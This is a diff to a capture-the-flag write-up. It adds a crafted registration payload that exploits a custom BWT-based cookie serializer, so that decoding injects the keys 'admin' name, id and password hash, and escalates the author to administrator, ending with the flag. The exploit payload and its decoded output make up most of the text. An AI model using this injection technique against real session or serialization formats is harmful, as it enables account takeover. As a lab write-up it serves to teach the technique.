@@ -269,16 +269,64 @@ SO I can manufacture a special key, which decodes into the object I want. Can I 
 
 From here I just had to understand how the encoder `lib/bwt.js` moves the bits around. And then I created a register payload.
 
+At this point I got so fluent in BWT code that I didn't code anything to spill out bwt code for me. It was like second nature. I created `bwt-payload.js` to test my wild theories.
+
 ```javascript
+// PAYLOAD BEFORE ENCODING
 {
-    'name': 'nytr0gen1337',
+    'name': 'nytr0gen31337',
     'age': 20,
     'desc': 13,
     "zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000": "\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +
         "\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" +
-        "\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" +
+        "\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5" +
         "\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000",
-    'password': '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',
+    'password': '65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5',
     'id': 'deadbeefb5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
 }
 ```
+
+What interests us is this part
+```
+"zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000":
+    "\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +
+    "\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" +
+    "\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5" +
+    "\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000",
+```
+
+So we have `4*z`, `5*\u00bd` and `\u0001\u0005\u0000\u0000\u0000`. This helps us skip 5 magic header bits from the key. Specifically `\u0001\u00bb\u0000\u0000\u0000`. So everything in the value part gets decoded as new keys.
+
+name. `\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin` admin yeah
+
+id. `\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`. sha256('admin')
+
+password. `\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5`. sha256('qwerty')
+
+As you have seen before, id is always put last when creating the session cookie. We have to make the decoder skip it, because it will overwrite our id. bad.
+
+`\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000`. this does exactly that. under the key `pl` with a length of `\u00ff\u00ff\u0000\u0000 == 65535`. It seems that if I tried a length lesser than what was after it, the script will fail miserably. But anything bigger is cool.
+
+What does it look like after decoding?
+
+```javascript
+// ENCODED_PAYLOAD AFTER DECODING
+{ name: 'admin',
+  age: 20,
+  desc: 13,
+  'zzzz½½½½½': '\u0001\u00bb\u0000\u0000\u0000',
+  id:
+   '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',
+  password:
+   '65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5',
+  pl:
+   '\u0000\u0000\b\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u0000deadbeefb5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918' }
+```
+
+We're IN! now i just have to login as `nytr0gen31337` and we're finished.
+
+```
+CTF{1892b0d8bc93d7e4ca98975f47f8c7d8}
+```
+
+that look like an md5. what's in there?
